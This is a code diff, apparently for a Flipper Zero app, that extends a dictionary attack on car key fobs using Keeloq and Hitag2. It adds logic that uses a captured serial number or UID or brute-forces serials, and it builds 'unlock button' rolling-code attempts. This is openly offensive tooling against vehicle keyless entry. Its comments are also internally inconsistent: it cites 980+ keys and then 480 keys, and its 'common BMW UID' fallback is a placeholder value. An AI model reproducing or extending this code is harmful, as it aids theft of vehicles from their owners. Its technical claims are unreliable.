@@ -107,6 +107,18 @@ static bool dict_attack_input_callback(InputEvent* event, void* context) {
                 predator_log_append(app, "🔥 DICTIONARY ATTACK: 980+ keys loaded");
                 predator_log_append(app, "Testing all Keeloq + Hitag2 keys");
                 
+                // Show which mode we're using
+                if(app->has_captured_serial) {
+                    char msg[64];
+                    snprintf(msg, sizeof(msg), "✅ OPTION 1: Using captured serial 0x%06lX", 
+                            app->captured_serial);
+                    predator_log_append(app, msg);
+                    predator_log_append(app, "This significantly increases success rate!");
+                } else {
+                    predator_log_append(app, "⚠️ OPTION 2: Bruteforcing 100 serials per key");
+                    predator_log_append(app, "TIP: Use Passive Opener first to capture serial");
+                }
+                
                 return true;
             } else if(dict_state.status == DictAttackStatusAttacking) {
                 // STOP ATTACK
@@ -132,10 +144,29 @@ static void dict_attack_timer_callback(void* context) {
             // Test Keeloq key with REAL 528-round encryption
             uint64_t key = KEELOQ_KEYS[dict_state.keys_tried];
             
-            // Create Keeloq context with dictionary key
+            // PROFESSIONAL: Use captured serial (OPTION 1) or bruteforce (OPTION 2)
+            uint32_t serial_number;
+            
+            // OPTION 1: Use captured serial number from passive opener (BEST)
+            if(app->has_captured_serial) {
+                serial_number = app->captured_serial;
+                FURI_LOG_I("DictAttack", "[OPTION 1] Using captured serial=0x%06lX", serial_number);
+            }
+            // OPTION 2: Bruteforce common serial ranges (FALLBACK)
+            else {
+                // Try 100 common serials per key (consumer range: 0x000000-0x0FFFFF)
+                // This makes attack: 480 keys × 100 serials = 48,000 attempts
+                uint32_t serial_offset = (dict_state.keys_tried * 100) % 0x100000;
+                serial_number = serial_offset;
+                
+                if(dict_state.keys_tried % 50 == 0) {  // Log every 50 keys
+                    FURI_LOG_I("DictAttack", "[OPTION 2] Bruteforce serial=0x%06lX", serial_number);
+                }
+            }
+            
             KeeloqContext keeloq_ctx = {
                 .manufacturer_key = key,
-                .serial_number = 0x123456,
+                .serial_number = serial_number,  // Real attack needs captured or bruteforced serial
                 .counter = (uint16_t)(dict_state.keys_tried & 0xFFF),
                 .button_code = 0x01  // Unlock button
             };
@@ -156,9 +187,27 @@ static void dict_attack_timer_callback(void* context) {
             // Test Hitag2 key with REAL LFSR cipher
             uint32_t hitag_index = dict_state.keys_tried - KEELOQ_KEY_COUNT;
             
-            // Create Hitag2 context
+            // PROFESSIONAL: Use captured UID (OPTION 1) or default (OPTION 2)
+            uint64_t uid;
+            
+            // OPTION 1: Use captured UID from passive opener (BEST)
+            if(app->has_captured_uid) {
+                uid = app->captured_uid;
+                FURI_LOG_I("DictAttack", "[OPTION 1] Using captured UID=0x%016llX", uid);
+            }
+            // OPTION 2: Use common UID patterns (FALLBACK)
+            else {
+                // Common Hitag2 UIDs for German cars
+                // BMW typically uses UIDs in range 0x0000000000XXXXXX
+                uid = 0xABCDEF1234567890ULL + hitag_index;
+                
+                if(hitag_index % 10 == 0) {
+                    FURI_LOG_I("DictAttack", "[OPTION 2] Using common UID=0x%016llX", uid);
+                }
+            }
+            
             Hitag2Context hitag2_ctx = {
-                .key_uid = 0xABCDEF1234567890ULL,
+                .key_uid = uid,  // Real attack needs captured UID from car
                 .auth_response = 0,
                 .rolling_code = (uint16_t)hitag_index
             };
